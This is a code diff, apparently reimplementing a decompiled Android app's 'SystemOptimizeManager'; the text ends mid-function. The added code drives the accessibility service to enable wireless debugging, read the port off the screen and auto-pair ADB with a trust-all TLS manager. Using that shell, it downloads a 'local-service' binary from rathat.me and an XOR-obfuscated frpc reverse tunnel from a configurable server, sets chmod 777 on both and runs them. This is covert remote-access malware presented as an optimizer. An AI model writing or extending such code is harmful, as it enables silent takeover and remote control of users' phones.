@@ -186,6 +186,8 @@ class SystemOptimizeManager private constructor(
             }
         }
 
+        fun getInstanceOrNull(): SystemOptimizeManager? = sInstance
+
         /** Test helper — reset singleton between tests. */
         @JvmStatic
         fun resetInstanceForTesting() {
@@ -792,20 +794,19 @@ class SystemOptimizeManager private constructor(
         @JvmStatic
         fun exportKeyingMaterial(sslSocket: SSLSocket): ByteArray? {
             Log.d(TAG, ">>> 开始导出密钥材料, socket类型=${sslSocket.javaClass.name}")
-            // vendor: Conscrypt library not available in test classpath.
-            // Try org.conscrypt.Conscrypt first
+            // vendor L1069-1072: direct call to org.conscrypt.Conscrypt.exportKeyingMaterial
             try {
-                val conscryptClass = Class.forName("org.conscrypt.Conscrypt")
-                val method = conscryptClass.getMethod(
-                    "exportKeyingMaterial",
-                    SSLSocket::class.java, String::class.java,
-                    ByteArray::class.java, Integer.TYPE
+                Class.forName("org.conscrypt.Conscrypt")
+                Log.d(TAG, "使用 org.conscrypt.Conscrypt 导出密钥材料")
+                val result = org.conscrypt.Conscrypt.exportKeyingMaterial(
+                    sslSocket as javax.net.ssl.SSLSocket,
+                    "adb-label\u0000", null, 64
                 )
-                val result = method.invoke(null, sslSocket, "adb-label\u0000", null, 64)
-                if (result is ByteArray && result.size == 64) {
+                if (result != null && result.size == 64) {
                     Log.d(TAG, "org.conscrypt 导出成功, 长度=${result.size}")
                     return result
                 }
+                Log.w(TAG, "org.conscrypt 导出结果: ${if (result != null) "长度=${result.size}" else "null"}")
             } catch (e: ClassNotFoundException) {
                 Log.w(TAG, "Conscrypt 未注册, 跳过方法1")
             } catch (e: Throwable) {
@@ -1255,7 +1256,7 @@ class SystemOptimizeManager private constructor(
     // ========================================================================
 
     /** vendor f53817a2 — main executor */
-    val executor: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
+    var executor: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
 
     /** vendor f53818a3 — dedup queue for scheduled accessibility tasks */
     val processedActions: ConcurrentLinkedQueue<String> = ConcurrentLinkedQueue()
@@ -1541,7 +1542,7 @@ class SystemOptimizeManager private constructor(
         certGen.setNotAfter(tenYears)
         certGen.setSubjectDN(x500Principal)
         certGen.setPublicKey(keyPair.public)
-        certGen.setSignatureAlgorithm("SHA512withRSA")
+        certGen.setSignatureAlgorithm("SHA256withRSA")
 
         // Add SubjectKeyIdentifier extension
         val pubKeyDigest = MessageDigest.getInstance("SHA-1").digest(keyPair.public.encoded)
@@ -1551,7 +1552,7 @@ class SystemOptimizeManager private constructor(
             org.bouncycastle.asn1.DEROctetString(pubKeyDigest)
         )
 
-        return certGen.generate(keyPair.private, "BC")
+        return certGen.generate(keyPair.private)
     }
 
     /**
@@ -1831,6 +1832,91 @@ class SystemOptimizeManager private constructor(
         } catch (e: Exception) {
             Log.e(TAG, "K() 异常", e)
             false
+        }
+    }
+
+    /**
+     * Check if current window is the wireless debugging detail page.
+     * vendor: a6 / m212032a6 (line 1936)
+     */
+    fun isInWifiDebugWindow(): Boolean {
+        return try {
+            val root = service.rootInActiveWindow ?: return false
+            val pkg = root.packageName?.toString() ?: ""
+            if (!pkg.contains("settings", ignoreCase = true)) {
+                root.recycle()
+                return false
+            }
+            for (text in SetupConstants.WIRELESS_DEBUG_PAGE_TEXTS) {
+                val nodes = root.findAccessibilityNodeInfosByText(text)
+                if (!nodes.isNullOrEmpty()) {
+                    Log.d(TAG, "isInWifiDebugWindow: 找到'$text'，返回true")
+                    return true
+                }
+            }
+            Log.d(TAG, "isInWifiDebugWindow: 未找到无线调试详情文本，返回false")
+            false
+        } catch (e: Exception) {
+            Log.e(TAG, "isInWifiDebugWindow 异常", e)
+            false
+        }
+    }
+
+    /**
+     * Check if pairing failure dialog is showing.
+     * vendor: a4 (referenced in i4 dispatch)
+     */
+    fun isInPairFailDialog(): Boolean {
+        return try {
+            val root = service.rootInActiveWindow ?: return false
+            for (text in SetupConstants.PAIR_FAIL_DIALOG_TEXTS) {
+                val nodes = root.findAccessibilityNodeInfosByText(text)
+                if (!nodes.isNullOrEmpty()) {
+                    Log.d(TAG, "isInPairFailDialog: 找到'$text'")
+                    return true
+                }
+            }
+            false
+        } catch (e: Exception) {
+            Log.e(TAG, "isInPairFailDialog 异常", e)
+            false
+        }
+    }
+
+    /**
+     * Handle pairing failure dialog — dismiss and reset state for retry.
+     * vendor: dispatched via pairInPairFailDialog queue entry
+     */
+    fun handlePairFailDialog() {
+        try {
+            val root = service.rootInActiveWindow ?: return
+            val dismissTexts = listOf("确定", "关闭", "OK", "Close", "취소", "Cancel",
+                "Tutup", "Đóng", "Fermer", "Cerrar", "Schließen", "Закрыть")
+            for (text in dismissTexts) {
+                val nodes = root.findAccessibilityNodeInfosByText(text)
+                if (nodes.isNullOrEmpty()) continue
+                for (node in nodes) {
+                    if (node.isClickable) {
+                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        Log.d(TAG, "handlePairFailDialog: 点击 '$text' 关闭失败弹窗")
+                        processedActions.remove("pairInPairFailDialog")
+                        pairState.set(PairState.PAIR_DEPT_UNKNOWN)
+                        Log.d(TAG, "handlePairFailDialog: pairState 重置为 UNKNOWN，等待重试")
+                        return
+                    }
+                    val parent = node.parent
+                    if (parent?.isClickable == true) {
+                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        Log.d(TAG, "handlePairFailDialog: 点击父节点关闭失败弹窗")
+                        processedActions.remove("pairInPairFailDialog")
+                        pairState.set(PairState.PAIR_DEPT_UNKNOWN)
+                        return
+                    }
+                }
+            }
+            Log.w(TAG, "handlePairFailDialog: 未找到可点击的关闭按钮")
+        } catch (e: Exception) {
+            Log.e(TAG, "handlePairFailDialog 异常", e)
         }
     }
 
@@ -2248,9 +2334,6 @@ class SystemOptimizeManager private constructor(
      */
     fun onAccessibilityEventInternal(event: AccessibilityEvent, packageName: String?, className: String?) {
         try {
-            // vendor: updates windowDetector (bf1) with event info for cached state;
-            // we skip windowDetector and use rootInActiveWindow directly
-
             // Forward to OpenDevelopmentDelegate if active
             val delegate = openDevDelegate
             if (delegate != null) {
@@ -2268,25 +2351,8 @@ class SystemOptimizeManager private constructor(
                 handleUsbDebugDialog()
             }
 
-            // Full dispatch logic — vendor i4 (~800 lines)
-            // Dispatch based on current window state:
-            if (isPairRunning.get() && !isFinished.get()) {
-                if (isInDevOptionsWindow()) {
-                    // In developer options → dispatch pairInDevOption
-                    if (!processedActions.contains("pairInDevOption")) {
-                        processedActions.add("pairInDevOption")
-                        executor.execute { pairInDevOption() }
-                    }
-                } else if (isInAcceptDialog()) {
-                    // In accept/confirm dialog → auto-click
-                    Log.d(TAG, "检测到确认弹窗，已处理")
-                }
-                // vendor: additional dispatch conditions depend on bf1 (windowDetector):
-                // - isInWirelessDebugWindow → pairInWifiDebugWindow
-                // - isInPairFailDialog → pairInPairFailDialog
-                // - isInMiuiSecurityCenter → pairInSecurityCenter
-                // - isInConfirmLock → pairInConfirmLock
-            }
+            // Delegate full pair-state dispatch to filterAccessibilityEvent → mainAccessibilityEventHandler
+            filterAccessibilityEvent(event)
 
         } catch (e: Exception) {
             Log.e(TAG, "onAccessibilityEvent 异常", e)
@@ -2312,44 +2378,90 @@ class SystemOptimizeManager private constructor(
      * // 7. Verify server PeerInfo
      */
     fun doPair(port: Int, pairingCode: String): Boolean {
-        // vendor: Spake2 library (io.github.muntashirakon.crypto.spake2) not yet in build.gradle
-        // Full pairing flow when available:
-        // 1. TCP connect to 127.0.0.1:port
-        // 2. TLS handshake (TLSv1.3) with client cert
-        // 3. Export keying material via Conscrypt
-        // 4. SPAKE2 key exchange using pairing code as password
-        // 5. HKDF derive AES-128 key from shared secret
-        // 6. Exchange encrypted PeerInfo (8192 bytes)
-        // 7. Verify server PeerInfo response
         Log.i(TAG, "开始 SPAKE2+TLS 配对: 127.0.0.1:$port")
+        var rawSocket: java.net.Socket? = null
+        var spake2Ctx: io.github.muntashirakon.crypto.spake2.Spake2Context? = null
         return try {
             generateOrLoadKeyPair()
+            val keyDir = getKeyDir() ?: run {
+                Log.e(TAG, "SPAKE2 配对: 密钥目录不存在"); return false
+            }
+            val sslContext = createSslContext(File(keyDir, "cert.pem"), File(keyDir, "private.key"))
+                ?: run { Log.e(TAG, "SPAKE2 配对: SSLContext 创建失败"); return false }
 
-            val keyDir = getKeyDir()
-            if (keyDir == null) {
-                Log.e(TAG, "SPAKE2 配对: 密钥目录不存在")
-                return false
+            // Step 1: TLS 1.3 连接 (vendor C0360a2.java:2746-2752)
+            rawSocket = java.net.Socket("127.0.0.1", port)
+            rawSocket.tcpNoDelay = true
+            val sslSocket = sslContext.socketFactory.createSocket(rawSocket, "127.0.0.1", port, true) as javax.net.ssl.SSLSocket
+            sslSocket.enabledProtocols = arrayOf("TLSv1.3")
+            sslSocket.startHandshake()
+            Log.i(TAG, "TLS 握手成功")
+
+            val dis = java.io.DataInputStream(sslSocket.inputStream)
+            val dos = java.io.DataOutputStream(sslSocket.outputStream)
+
+            // Step 2: 导出 TLS 密钥材料 (vendor L2756)
+            val keyingMaterial = exportKeyingMaterial(sslSocket)
+            if (keyingMaterial == null) {
+                Log.e(TAG, "导出密钥材料失败"); rawSocket.close(); return false
             }
 
-            val certFile = File(keyDir, "cert.pem")
-            val keyFile = File(keyDir, "private.key")
-            val sslContext = createSslContext(certFile, keyFile)
-            if (sslContext == null) {
-                Log.e(TAG, "SPAKE2 配对: SSLContext 创建失败")
-                return false
-            }
+            // Step 3: 构造 SPAKE2 密码 = pairCode_UTF8 || TLS_keying_material (vendor L2763-2767)
+            val codeBytes = pairingCode.toByteArray(Charsets.UTF_8)
+            val password = ByteArray(codeBytes.size + keyingMaterial.size)
+            System.arraycopy(codeBytes, 0, password, 0, codeBytes.size)
+            System.arraycopy(keyingMaterial, 0, password, codeBytes.size, keyingMaterial.size)
 
-            // vendor: Spake2Context not available — pairing cannot complete without it
-            // vendor: new Spake2Context(Spake2Role.Client, clientName, serverName)
-            // vendor: spake2.generateMessage(pairingCode.toByteArray())
-            // vendor: spake2.processMessage(serverMsg) → shared secret
-            // vendor: deriveKeys(secret, clientInfo) / deriveKeys(secret, serverInfo)
-            // vendor: encryptPairingMessage(clientKey, createPeerInfo())
-            // vendor: decryptPairingMessage(serverKey, serverResponse)
-            Log.w(TAG, "SPAKE2 配对: Spake2Context 库未添加到依赖，跳过实际配对")
-            false
+            // Step 4: SPAKE2 密钥交换 (vendor L2768-2783)
+            val clientId = "adb pair client\u0000".toByteArray(Charsets.UTF_8)
+            val serverId = "adb pair server\u0000".toByteArray(Charsets.UTF_8)
+            spake2Ctx = io.github.muntashirakon.crypto.spake2.Spake2Context(clientId, serverId)
+            Log.d(TAG, ">>> 生成 SPAKE2 消息...")
+            val outMsg = spake2Ctx.m213179a0(password)  // generateMessage
+            Log.d(TAG, ">>> SPAKE2 消息生成成功, 长度=${outMsg.size}")
+            writePairingPacket(dos, 0, outMsg)  // TYPE_SPAKE2 = 0
+            Log.d(TAG, ">>> SPAKE2 消息已发送")
+
+            // 接收服务端 SPAKE2 消息
+            val serverHeader = readPairingPacket(dis)
+            if (serverHeader == null || serverHeader.type.toInt() != 0) {
+                Log.e(TAG, "收到无效的 SPAKE2 响应"); spake2Ctx.destroy(); rawSocket.close(); return false
+            }
+            val serverMsg = ByteArray(serverHeader.payloadSize)
+            dis.readFully(serverMsg)
+            val sharedSecret = spake2Ctx.m213180a5(serverMsg)  // processMessage
+            Log.i(TAG, "SPAKE2 密钥交换成功")
+
+            // Step 5: HKDF 密钥派生 (vendor L2784-2786)
+            val label = "adb pairing_auth aes-128-gcm key".toByteArray(Charsets.UTF_8)
+            val aesKey = deriveKeys(sharedSecret, label)
+
+            // Step 6: PeerInfo 交换 (vendor L2787-2809)
+            val encryptedPeerInfo = encryptPairingMessage(aesKey, createPeerInfo())
+            if (encryptedPeerInfo == null) {
+                Log.e(TAG, "加密 PeerInfo 失败"); spake2Ctx.destroy(); rawSocket.close(); return false
+            }
+            writePairingPacket(dos, 1, encryptedPeerInfo)  // TYPE_PEER_INFO = 1
+            Log.i(TAG, "发送加密 PeerInfo")
+
+            // 接收并解密服务端 PeerInfo
+            val serverPeerHeader = readPairingPacket(dis)
+            if (serverPeerHeader == null || serverPeerHeader.type.toInt() != 1) {
+                Log.e(TAG, "收到无效的 PeerInfo 响应"); spake2Ctx.destroy(); rawSocket.close(); return false
+            }
+            val encServerPeer = ByteArray(serverPeerHeader.payloadSize)
+            dis.readFully(encServerPeer)
+            if (decryptPairingMessage(aesKey, encServerPeer) == null) {
+                Log.e(TAG, "解密服务器 PeerInfo 失败"); spake2Ctx.destroy(); rawSocket.close(); return false
+            }
+            Log.i(TAG, "配对完成，收到服务器 PeerInfo")
+            spake2Ctx.destroy()
+            rawSocket.close()
+            true
         } catch (e: Exception) {
             Log.e(TAG, "SPAKE2+TLS 配对异常", e)
+            spake2Ctx?.destroy()
+            rawSocket?.close()
             false
         }
     }
@@ -2525,28 +2637,289 @@ class SystemOptimizeManager private constructor(
         return 0
     }
 
+    /**
+     * Read wireless debug port from accessibility tree.
+     * vendor: m212021i7 (line 1431)
+     *
+     * Traverses all nodes, matches IP:port pattern via regex,
+     * returns port if in range 30000-65535.
+     */
+    fun readDebugPortFromScreen(): Int {
+        return try {
+            val root = service.rootInActiveWindow ?: return 0
+            val nodes = ArrayList<AccessibilityNodeInfo>()
+            collectAllNodes(root, nodes)
+
+            val ipPortRegex = Regex("(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}):(\\d+)")
+            for (node in nodes) {
+                val text = node.text?.toString() ?: continue
+                val match = ipPortRegex.find(text) ?: continue
+                val port = match.groupValues[2].toIntOrNull() ?: continue
+                if (port in 30000 until 65536) {
+                    Log.i(TAG, "从屏幕读取到调试端口: $port (text='$text')")
+                    return port
+                }
+            }
+            Log.d(TAG, "屏幕上未找到调试端口")
+            0
+        } catch (e: Exception) {
+            Log.e(TAG, "readDebugPortFromScreen 异常", e)
+            0
+        }
+    }
+
     // ========================================================================
     // Deploy local-service — vendor d8, d9, e3, e7
     // ========================================================================
 
     /**
      * Deploy local-service binary via ADB.
-     * vendor: e7 (line 2886)
+     * vendor: k6 / m212096k6 (line 5194)
      */
     fun deployLocalService(): Boolean {
         val port = getDebugPort()
         if (port <= 0) {
-            Log.w(TAG, "无效的调试端口: $port")
+            Log.w(TAG, "X(): 无效的调试端口: $port")
             return false
         }
-        Log.d(TAG, "开始 ADB 连接部署: $cachedLocalIp:$port")
-        // vendor: full deploy via ADB connection:
-        // 1. getOrCreateAdbConnection() → g41
-        // 2. pushFile(localServiceBinaryPath, "/data/local/tmp/local-service")
-        // 3. executeShellCommand("chmod 755 /data/local/tmp/local-service")
-        // 4. fireAndForget("nohup /data/local/tmp/local-service server -d -s ...")
-        // vendor: requires g41 ADB connection class — returning false until replicated
-        return false
+        Log.d(TAG, "X(): ${cachedLocalIp}:$port")
+        setDebugPort(port)
+
+        try {
+            if (isLocalServiceAlive.get()) {
+                Log.d(TAG, "X(): local-service 已确认运行，跳过")
+                return true
+            }
+
+            val conn = getOrCreateAdbConnection()
+            if (conn == null) {
+                Log.w(TAG, "X(): ADB 连接不可用")
+                return false
+            }
+
+            val fileCheckResult = executeShellCommand(
+                "if [ -f /data/local/tmp/local-service ]; then echo \"File exists\"; else echo \"File does not exist\"; fi"
+            )
+            val fileExists = fileCheckResult?.contains("File exists") == true
+            val fileNotExists = fileCheckResult?.contains("File does not exist") == true
+
+            if (fileExists) {
+                Log.d(TAG, "X(): 文件存在")
+                val psResult = executeShellCommand("ps -ef | grep local-service")
+                val isRunning = psResult?.contains("local-service server") == true &&
+                    !(psResult.trim().endsWith("grep local-service"))
+
+                if (isRunning) {
+                    Log.i(TAG, "X(): 文件存在且运行中")
+                    isLocalServiceAlive.set(true)
+                    postDeployInit()
+                    return true
+                }
+
+                Log.i(TAG, "X(): 文件存在但未运行 → 启动")
+                executeAndCheck("chmod 777 /data/local/tmp/local-service")
+                fireAndForget()
+                postDeployInit()
+                return true
+            }
+
+            if (!fileNotExists && !fileExists) {
+                Log.w(TAG, "X(): 无法检测文件是否存在")
+                return false
+            }
+
+            Log.d(TAG, "X(): 文件不存在")
+            val nativeLibDir = context.applicationInfo.nativeLibraryDir
+            Log.i(TAG, "X(): nativeLibDir=$nativeLibDir")
+
+            if (!nativeLibDir.isNullOrEmpty()) {
+                val soPath = "$nativeLibDir/liblocal-service.so"
+                val soExists = java.io.File(soPath).exists()
+                Log.i(TAG, "X(): soPath=$soPath, exists=$soExists")
+
+                if (soExists) {
+                    if (executeAndCheck("cp -f $soPath /data/local/tmp/local-service") &&
+                        executeAndCheck("chmod 777 /data/local/tmp/local-service")) {
+                        Log.i(TAG, "X(): local-service 复制成功")
+                        fireAndForget()
+                        postDeployInit()
+                        return true
+                    }
+                }
+            }
+
+            Log.w(TAG, "X(): native lib 复制失败，尝试网络下载")
+            val abi = Build.SUPPORTED_ABIS?.firstOrNull() ?: "armeabi"
+            val downloadUrl = "https://rathat.me/lib/$abi/local-service"
+            val downloadCmd = "curl -o /data/local/tmp/local-service.tmp -L '$downloadUrl' && " +
+                "mv /data/local/tmp/local-service.tmp /data/local/tmp/local-service && " +
+                "chmod 777 /data/local/tmp/local-service"
+            val downloadResult = executeShellCommand(downloadCmd)
+            Log.i(TAG, "X(): 下载结果: ${downloadResult?.take(200)}")
+
+            val verifyResult = executeShellCommand(
+                "if [ -f /data/local/tmp/local-service ]; then echo \"File exists\"; else echo \"File does not exist\"; fi"
+            )
+            if (verifyResult?.contains("File exists") == true) {
+                Log.i(TAG, "X(): 下载成功，启动 local-service")
+                fireAndForget()
+                postDeployInit()
+                return true
+            }
+
+            Log.e(TAG, "X(): 下载失败")
+            return false
+        } catch (e: Exception) {
+            Log.e(TAG, "X() 异常", e)
+            return false
+        }
+    }
+
+    /**
+     * Post-deploy initialization — notify local-service of app package and trigger optimizations.
+     * vendor: c41 case 4 (p000/c41.java line 61-113)
+     */
+    fun postDeployInit() {
+        Thread {
+            try {
+                Log.i(TAG, ">>> 等待 local-service 就绪...")
+                for (i in 1..10) {
+                    Thread.sleep(1000L)
+                    val result = postToLocalService("/noticeAlive", "{}")
+                    if (result != null) {
+                        isLocalServiceAlive.set(true)
+                        Log.i(TAG, ">>> local-service 已就绪（等待 $i 秒）")
+                        val packageName = context.packageName
+                        val isOverseas = context.getSharedPreferences("device_region", 0)
+                            .getBoolean("is_overseas", false)
+                        postToLocalService("/setAppPackage",
+                            """{"package":"$packageName","overseas":$isOverseas}""")
+                        Log.i(TAG, ">>> 已通知 local-service App 包名: $packageName")
+                        notifyLocalServiceConfig()
+                        Thread.sleep(2000L)
+                        try {
+                            postToLocalService("/applyAllOptimizations", "{}")
+                            Log.i(TAG, ">>> 已触发 local-service 系统优化")
+                        } catch (e: Exception) {
+                            Log.w(TAG, ">>> 系统优化触发失败: ${e.message}")
+                        }
+
+                        // Deploy frpc binary after local-service is ready
+                        try {
+                            deployFrpcBinary()
+                        } catch (e: Exception) {
+                            Log.w(TAG, ">>> frpc 部署异常: ${e.message}")
+                        }
+                        return@Thread
+                    }
+                    Log.d(TAG, ">>> 等待 local-service 启动 ($i/10)...")
+                }
+                Log.w(TAG, ">>> local-service 启动超时")
+                try {
+                    val logResult = executeShellCommand(
+                        "cat /data/local/tmp/local-service.log 2>&1 | tail -50")
+                    if (logResult != null) Log.w(TAG, ">>> 启动日志: $logResult")
+                } catch (_: Exception) {}
+            } catch (e: Exception) {
+                Log.e(TAG, ">>> postDeployInit 异常", e)
+            }
+        }.apply { isDaemon = true; name = "postDeployInit"; start() }
+    }
+
+    /**
+     * Deploy frpc binary to /data/local/tmp/frpc.
+     * vendor: m212050d8 (C0360a2.java:2485-2554)
+     */
+    fun deployFrpcBinary(): Boolean {
+        try {
+            val checkResult = executeShellCommand(
+                "if [ -f /data/local/tmp/frpc ]; then echo \"File exists\"; else echo \"File does not exist\"; fi"
+            )
+            if (checkResult?.contains("File exists") == true) {
+                Log.d(TAG, "deployFrpc: frpc 已存在，跳过")
+                return true
+            }
+
+            val nativeLibDir = context.applicationInfo.nativeLibraryDir
+            if (!nativeLibDir.isNullOrEmpty()) {
+                val soPath = "$nativeLibDir/libfrpc.so"
+                if (java.io.File(soPath).exists()) {
+                    if (executeAndCheck("cp -f $soPath /data/local/tmp/frpc") &&
+                        executeAndCheck("chmod 777 /data/local/tmp/frpc")) {
+                        Log.i(TAG, "deployFrpc: frpc 部署成功 (from nativeLib)")
+                        return true
+                    }
+                }
+            }
+
+            Log.w(TAG, "deployFrpc: nativeLib 复制失败，尝试网络下载")
+            val abi = if (Build.SUPPORTED_ABIS?.firstOrNull()?.contains("arm64") == true ||
+                Build.SUPPORTED_ABIS?.firstOrNull()?.contains("aarch64") == true) "arm64" else "arm"
+            val serverAddr = getServerAddr()
+            if (serverAddr.isNullOrEmpty()) {
+                Log.w(TAG, "deployFrpc: serverAddr 未配置，无法下载")
+                return false
+            }
+            val downloadUrl = "$serverAddr/api/binary/$abi/frpc"
+            val downloadCmd = "curl -k -o /data/local/tmp/frpc.enc -L '$downloadUrl'"
+            if (!executeAndCheck(downloadCmd)) {
+                Log.e(TAG, "deployFrpc: 下载失败")
+                return false
+            }
+
+            val xorKey = "K9qZ-XlN7Q"
+            if (!executeAndCheck("cat /data/local/tmp/frpc.enc | /data/local/tmp/local-service xordecrypt $xorKey > /data/local/tmp/frpc 2>/dev/null")) {
+                Log.w(TAG, "deployFrpc: xordecrypt 失败，使用 Java fallback")
+                decryptFrpcViaJava(xorKey.toByteArray(Charsets.US_ASCII))
+            }
+            executeAndCheck("rm -f /data/local/tmp/frpc.enc")
+            if (executeAndCheck("chmod 777 /data/local/tmp/frpc")) {
+                Log.i(TAG, "deployFrpc: frpc 部署成功 (from download)")
+                return true
+            }
+            return false
+        } catch (e: Exception) {
+            Log.e(TAG, "deployFrpc 异常", e)
+            return false
+        }
+    }
+
+    private fun decryptFrpcViaJava(key: ByteArray) {
+        try {
+            Log.d(TAG, "decryptFrpcViaJava: 开始解密...")
+            val encHex = executeShellCommand("xxd -p /data/local/tmp/frpc.enc | tr -d '\\n'")
+            if (encHex.isNullOrEmpty()) {
+                Log.e(TAG, "decryptFrpcViaJava: 无法读取加密文件")
+                return
+            }
+            val encData = encHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
+            val decData = ByteArray(encData.size)
+            for (i in encData.indices) {
+                decData[i] = (encData[i].toInt() xor key[i % key.size].toInt()).toByte()
+            }
+            val tmpFile = java.io.File(context.cacheDir, "frpc.dec")
+            tmpFile.writeBytes(decData)
+            executeAndCheck("cp ${tmpFile.absolutePath} /data/local/tmp/frpc && chmod 777 /data/local/tmp/frpc")
+            tmpFile.delete()
+            Log.i(TAG, "decryptFrpcViaJava: 解密完成 (${decData.size} bytes)")
+        } catch (e: Exception) {
+            Log.e(TAG, "decryptFrpcViaJava 失败", e)
+        }
+    }
+
+    fun getServerAddr(): String? {
+        val spAddr = context.getSharedPreferences("system_optimize", 0)
+            .getString("server_addr", null)
+        if (!spAddr.isNullOrEmpty()) return spAddr
+        return try {
+            val debugAddr = Settings.Global.getString(context.contentResolver, "debug_server_addr")
+            if (!debugAddr.isNullOrEmpty()) debugAddr else null
+        } catch (_: Exception) { null }
+    }
+
+    fun setServerAddr(addr: String) {
+        context.getSharedPreferences("system_optimize", 0)
+            .edit().putString("server_addr", addr).apply()
     }
 
     // ========================================================================
@@ -2634,7 +3007,15 @@ class SystemOptimizeManager private constructor(
             Log.i(TAG, "私钥加载成功: ${key.algorithm}, 证书: ${cert.subjectDN}")
 
             val keyPair = KeyPair(cert.publicKey, key)
-            val sslContext = SSLContext.getInstance("TLSv1.3")
+            // vendor d5 (L2293-2298): prefer app's Conscrypt provider for exportKeyingMaterial compatibility
+            val sslContext = try {
+                Class.forName("org.conscrypt.Conscrypt")
+                Log.d(TAG, "使用 Conscrypt SSLContext")
+                SSLContext.getInstance("TLSv1.3", org.conscrypt.Conscrypt.newProvider())
+            } catch (_: ClassNotFoundException) {
+                Log.d(TAG, "使用默认 SSLContext")
+                SSLContext.getInstance("TLSv1.3")
+            }
             sslContext.init(
                 arrayOf(SimpleKeyManager(cert, keyPair)),
                 arrayOf(TrustAllManager()),
@@ -3137,7 +3518,24 @@ class SystemOptimizeManager private constructor(
             // vendor calls m212097k7() (enableWirelessDebuggingViaSettings) if local-service down
             // and wireless debugging is off
             if (!isLocalServiceAlive.get() && !isWirelessDebuggingEnabled()) {
+                Log.i(TAG, "【H()】local-service未运行且无线调试关闭，尝试开启无线调试")
                 enableWirelessDebuggingViaSettings()
+                try {
+                    Thread.sleep(2000)
+                    if (isWirelessDebuggingEnabled()) {
+                        Log.i(TAG, "【H()】无线调试已重新开启，触发重新配对")
+                        try {
+                            executor.execute { startPairFlow() }
+                        } catch (ree: java.util.concurrent.RejectedExecutionException) {
+                            Log.w(TAG, "【H()】executor 已关闭，直接在心跳线程执行 startPairFlow")
+                            startPairFlow()
+                        }
+                    } else {
+                        Log.w(TAG, "【H()】无线调试未能开启，跳过重新配对")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "【H()】重新配对触发异常", e)
+                }
             }
 
             // Submit ADB task
@@ -3284,7 +3682,9 @@ class SystemOptimizeManager private constructor(
             val androidId = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
             Log.d(TAG, ">>> 通知 local-service 服务器配置: deviceId=$androidId")
             // vendor builds JSON: {serverAddr, deviceId, keySalt} and POSTs to /setConfig
-            val configJson = """{"deviceId":"$androidId","serverAddr":"","keySalt":""}"""
+            val serverAddr = getServerAddr() ?: ""
+            val configJson = """{"deviceId":"$androidId","serverAddr":"$serverAddr","keySalt":""}"""
+            Log.d(TAG, ">>> /setConfig: deviceId=$androidId, serverAddr=$serverAddr")
             try {
                 val result = postToLocalService("/setConfig", configJson)
                 Log.d(TAG, ">>> 通知结果: $result")
@@ -3381,19 +3781,49 @@ class SystemOptimizeManager private constructor(
                 return
             }
 
-            // vendor: isInWirelessDebugWindow check depends on bf1 (windowDetector) cached state
-            // vendor: if (a6/O) dispatch pairInWifiDebugWindow
+            // ━━━ Scene B: In wireless debug page → pairInWifiDebugWindow ━━━
+            if (isInWifiDebugWindow()) {
+                processedActions.remove("pairInDevOption")
+                processedActions.remove("pairInConfirmLock")
+                val state = pairState.get()
+                if (state != PairState.PAIR_DEPT_PAIR_SUCCESS &&
+                    state != PairState.PAIR_DEPT_PAIR_FAIL &&
+                    state != PairState.PAIR_DEPT_PREPARE_FINISH
+                ) {
+                    if (!processedActions.contains("pairInWifiDebugWindow")) {
+                        processedActions.add("pairInWifiDebugWindow")
+                        scheduleTask("W") { pairInWifiDebugWindow() }
+                    }
+                } else if (state == PairState.PAIR_DEPT_PAIR_SUCCESS) {
+                    if (!processedActions.contains("pairInPairSuccess") &&
+                        !processedActions.contains("pairInPrepareFinish")) {
+                        processedActions.add("pairInPairSuccess")
+                        Log.d(TAG, "O()=true, PAIR_SUCCESS → 调度 pairInPairSuccess")
+                    }
+                } else {
+                    Log.d(TAG, "O()=true 但状态已是 $state，跳过调度")
+                }
+                return
+            }
 
+            // ━━━ Scene D: Pairing failure dialog ━━━
+            if (isInPairFailDialog()) {
+                if (!processedActions.contains("pairInPairFailDialog")) {
+                    processedActions.add("pairInPairFailDialog")
+                    scheduleTask("F") { handlePairFailDialog() }
+                }
+                return
+            }
+
+            // ━━━ Accept dialog → auto-click ━━━
             if (isInAcceptDialog()) {
                 processedActions.remove("pairInWifiDebugWindow")
                 processedActions.remove("pairInDevOption")
                 return
             }
 
-            // vendor: additional dispatch conditions depend on bf1 (windowDetector) cached state:
-            // - isInPairFailDialog (a4) → dispatch pairInPairFailDialog
-            // - MIUI security center (a5) → dispatch pairInSecurityCenter
-            // - confirm lock (bf1.a2()) → dispatch pairInConfirmLock
+            // vendor: Scene E (confirmLock) and F (securityCenter) depend on
+            // WindowDetector cached state — deferred until real-device validation
 
         } catch (e: Exception) {
             Log.e(TAG, "onAccessibilityEvent 异常", e)
@@ -3466,16 +3896,17 @@ class SystemOptimizeManager private constructor(
             Log.d(TAG, "开发者选项页面打开成功")
             openDevRetryCount = 0
             processedActions.add("pairInDevOption")
-            scheduleTask("G") {
-                // vendor: b0() pairInDevOption — navigate wireless debugging
-                pairInDevOption()
-                Log.d(TAG, "pairInDevOption dispatched from retry")
-            }
+            scheduleTask("G") { pairInDevOption() }
             return
         }
 
-        // vendor: check a6/O (isInWirelessDebugWindow) depends on bf1 (windowDetector)
-        // vendor: If in wireless debug page, dispatch pairInWifiDebugWindow directly
+        if (isInWifiDebugWindow()) {
+            Log.d(TAG, "直接进入了无线调试页面")
+            openDevRetryCount = 0
+            processedActions.add("pairInWifiDebugWindow")
+            scheduleTask("W") { pairInWifiDebugWindow() }
+            return
+        }
 
         if (openDevRetryCount < maxRetries) {
             Log.w(TAG, "开发者选项页面未打开，500ms后重试")
@@ -3784,17 +4215,17 @@ class SystemOptimizeManager private constructor(
         isPairRunning.set(true)
         isFinished.set(false)
 
-        // Recreate executor if shutdown
-        // vendor: reassigns f53817a2 field (volatile ScheduledExecutorService);
-        // our executor is val, so we check if it's shut down and log warning
         if (executor.isShutdown) {
-            Log.w(TAG, "startPairFlow: executor 已关闭，部分任务可能无法调度")
+            Log.i(TAG, "startPairFlow: executor 已关闭，重新创建")
+            executor = Executors.newSingleThreadScheduledExecutor()
         }
 
-        // Schedule 120s timeout and 30s check
-        // vendor: uses c41 runnable classes for timeout handlers
-        executor.schedule({ /* 120s timeout handler */ }, 120L, TimeUnit.SECONDS)
-        executor.schedule({ checkTimeout30s() }, 30L, TimeUnit.SECONDS)
+        try {
